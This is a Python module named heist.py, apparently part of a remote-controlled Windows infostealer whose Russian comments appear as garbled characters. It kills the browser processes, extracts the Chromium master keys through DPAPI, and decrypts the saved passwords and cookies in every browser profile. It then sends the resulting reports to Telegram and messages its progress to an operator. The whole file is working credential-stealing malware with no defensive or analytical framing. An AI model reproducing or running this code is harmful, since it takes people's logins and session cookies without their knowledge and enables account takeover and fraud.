# –§–∞–π–ª: heist.py
import os
import json
import base64
import sqlite3
import shutil
import time
from datetime import datetime
import psutil

# –ü—Ä–æ–±—É–µ–º –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–µ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.
try:
    from Crypto.Cipher import AES
    import win32crypt
except ImportError:
    AES, win32crypt = None, None

# –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –Ω–∞—à–∏ —É—Ç–∏–ª–∏—Ç—ã
from utils import send_status_to_operator, send_telegram_document, TEMP_PATH

def find_chromium_paths():
    """–ù–∞—Ö–æ–¥–∏—Ç –ø—É—Ç–∏ –∫–æ –≤—Å–µ–º Chromium-–±—Ä–∞—É–∑–µ—Ä–∞–º, –≤–∫–ª—é—á–∞—è –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ."""
    # –ñ—ë—Å—Ç–∫–æ –ø—Ä–æ–ø–∏—Å—ã–≤–∞–µ–º –∏–∑–≤–µ—Å—Ç–Ω—ã–µ –ø—É—Ç–∏ –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–π –Ω–∞–¥—ë–∂–Ω–æ—Å—Ç–∏
    paths = {
        'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
        'Opera Stable': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data'),
        'Yandex Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data'),
    }
    return {name: path for name, path in paths.items() if os.path.exists(path)}

def get_master_key(browser_path):
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á, –±–µ–∑–æ–ø–∞—Å–Ω–æ –ø—Ä–æ–≤–µ—Ä—è—è —Å—Ç—Ä—É–∫—Ç—É—Ä—É JSON."""
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
            return None
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_value(encrypted_value, master_key):
    """–†–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ, –∏—Å–ø–æ–ª—å–∑—É—è AES GCM –∏–ª–∏ DPAPI."""
    if not encrypted_value or not master_key: return "N/A (–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö)"
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv, payload = encrypted_value[3:15], encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_val = cipher.decrypt(payload)
            return decrypted_val[:-16].decode(errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors='ignore')
    except Exception:
        return "N/A (–æ—à–∏–±–∫–∞ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏)"

# --- –ù–û–í–´–ô, –ü–£–õ–ï–ù–ï–ü–†–û–ë–ò–í–ê–ï–ú–´–ô –ò–ó–í–õ–ï–ö–ê–¢–ï–õ–¨ –î–ê–ù–ù–´–• ---
def extract_data_from_db(db_path, query, processor_func, master_key):
    """–ù–∞–¥—ë–∂–Ω–æ –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ –ª—é–±–æ–π SQLite –±–∞–∑—ã."""
    results = []
    if not os.path.exists(db_path): return results

    # –£–Ω–∏–∫–∞–ª—å–Ω–æ–µ –∏–º—è –¥–ª—è –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –∫–æ–Ω—Ñ–ª–∏–∫—Ç–æ–≤
    temp_db = os.path.join(TEMP_PATH, f'temp_{os.path.basename(db_path)}_{os.urandom(4).hex()}.db')
    try:
        shutil.copy2(db_path, temp_db)
    except (IOError, shutil.SameFileError) as e:
        print(f"[!] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å {os.path.basename(db_path)}: {e}")
        return results

    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        conn.text_factory = bytes # –ß–∏—Ç–∞–µ–º –≤—Å—ë –∫–∞–∫ –±–∞–π—Ç—ã, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –æ—à–∏–±–æ–∫ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è
        cursor = conn.cursor()
        cursor.execute(query)
        for row in cursor.fetchall():
            results.extend(processor_func(row, master_key))
    except Exception as e: print(f"[!]–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è –∏–∑ {os.path.basename(temp_db)}: {e}")
    finally:
        if conn: conn.close()
        time.sleep(0.1) # –î–∞–µ–º –û–° –≤—Ä–µ–º—è –æ–¥—É–º–∞—Ç—å—Å—è
        if os.path.exists(temp_db): os.remove(temp_db)
    return results

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ –¥–∞–Ω–Ω—ã—Ö, —Ç–µ–ø–µ—Ä—å —Ä–∞–±–æ—Ç–∞—é—Ç —Å –±–∞–π—Ç–∞–º–∏
def process_password(row, master_key):
    url, username, pwd_value = row[0].decode(errors='ignore'), row[1].decode(errors='ignore'), row[2]
    if username and pwd_value:
        return [f"URL: {url}\n  –õ–æ–≥–∏–Ω: {username}\n  –ü–∞—Ä–æ–ª—å: {decrypt_value(pwd_value, master_key)}\n"]
    return []

def process_cookie(row, master_key):
    host, name, enc_value = row[0].decode(errors='ignore'), row[1].decode(errors='ignore'), row[2]
    if enc_value:
        # –£–±—Ä–∞–Ω–æ —Å–æ–∫—Ä–∞—â–µ–Ω–∏–µ –∫—É–∫–∏
        return [f"–°–∞–π—Ç: {host}\n  –ò–º—è: {name}\n  –ö—É–∫–∏: {decrypt_value(enc_value, master_key)}\n"]
    return []

def kill_browsers():
    """–£–±–∏–≤–∞–µ—Ç –≤—Å–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –±—Ä–∞—É–∑–µ—Ä–æ–≤, –≤–∫–ª—é—á–∞—è –Ø–Ω–¥–µ–∫—Å."""
    browser_processes = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe", "browser.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in browser_processes:
            try: proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied): pass

def start_heist(ws, loop):
    send_status_to_operator(ws, loop, "üî• –ù–∞—á–∏–Ω–∞—é HEIST...")
    if AES is None or win32crypt is None:
        send_status_to_operator(ws, loop, "‚ùå –ü–†–û–í–ê–õ: –û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ (pycryptodomex, pywin32).")
        return

    credentials_report, cookies_report = [f"üîë –û—Ç—á–µ—Ç –ø–æ —É—á–µ—Ç–Ω—ã–º –¥–∞–Ω–Ω—ã–º –æ—Ç {datetime.now():%Y-%m-%d %H:%M:%S} üîë\n"], [f"üç™ –û—Ç—á–µ—Ç –ø–æ Cookies –æ—Ç {datetime.now():%Y-%m-%d %H:%M:%S} üç™\n"]

    try:
        send_status_to_operator(ws, loop, "–ó–∞–≤–µ—Ä—à–∞—é –ø—Ä–æ—Ü–µ—Å—Å—ã –±—Ä–∞—É–∑–µ—Ä–æ–≤...")
        kill_browsers()

        send_status_to_operator(ws, loop, "–ò—â—É —Ü–µ–ª–∏...")
        browser_paths = find_chromium_paths()
        if not browser_paths:
            send_status_to_operator(ws, loop, "–ù–∏ –æ–¥–∏–Ω –∏–∑ —Ü–µ–ª–µ–≤—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            return

        for browser, path in browser_paths.items():
            send_status_to_operator(ws, loop, f"–¶–µ–ª—å: {browser}. –ò–∑–≤–ª–µ–∫–∞—é –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á...")
            master_key = get_master_key(path)
            if not master_key: continue

            # –ò—â–µ–º –¥–∞–Ω–Ω—ã–µ –≤–æ –í–°–ï–• –ø—Ä–æ—Ñ–∏–ª—è—Ö –±—Ä–∞—É–∑–µ—Ä–∞
            profiles = ['Default'] + [d for d in os.listdir(path) if d.startswith('Profile ')]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.isdir(profile_path): continue

                report_header = f"\n--- {browser.upper()} (–ü—Ä–æ—Ñ–∏–ª—å: {profile}) ---\n"

                # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–æ–ª–∏ –∏ –∫–∞—Ä—Ç—ã
                passwords = extract_data_from_db(os.path.join(profile_path, 'Login Data'), "SELECT origin_url, username_value, password_value FROM logins", process_password, master_key)

                # –ò–∑–≤–ª–µ–∫–∞–µ–º –∫—É–∫–∏
                cookies = extract_data_from_db(os.path.join(profile_path, 'Network', 'Cookies'), "SELECT host_key, name, encrypted_value FROM cookies", process_cookie, master_key)

                if passwords:
                    credentials_report.append(report_header)
                    credentials_report.append("\n[*] –ü–∞—Ä–æ–ª–∏:\n"); credentials_report.extend(passwords)

                if cookies:
                    cookies_report.append(report_header)
                    cookies_report.extend(cookies)

        hostname = os.getlogin()
        credentials_file, cookies_file = os.path.join(TEMP_PATH, f"credentials_{hostname}.txt"), os.path.join(TEMP_PATH, f"cookies_{hostname}.txt")

        with open(credentials_file, "w", encoding="utf-8") as f: f.write("\n".join(credentials_report))
        with open(cookies_file, "w", encoding="utf-8") as f: f.write("\n".join(cookies_report))

        send_status_to_operator(ws, loop, "–û—Ç–ø—Ä–∞–≤–ª—è—é –æ—Ç—á–µ—Ç—ã –≤ Telegram...")
        send_telegram_document(credentials_file, f"üîë –£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç {hostname}")
        send_telegram_document(cookies_file, f"üç™ –ö—É–∫–∏ –æ—Ç {hostname}")
        send_status_to_operator(ws, loop, "‚úÖ HEIST –∑–∞–≤–µ—Ä—à–µ–Ω. –î–≤–∞ –æ—Ç—á–µ—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.")

        os.remove(credentials_file); os.remove(cookies_file)

    except Exception as e:
        error_message = f"‚ùå –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô –ü–†–û–í–ê–õ HEIST: {e}"
        print(f"[!!!] {error_message}")
        send_status_to_operator(ws, loop, error_message)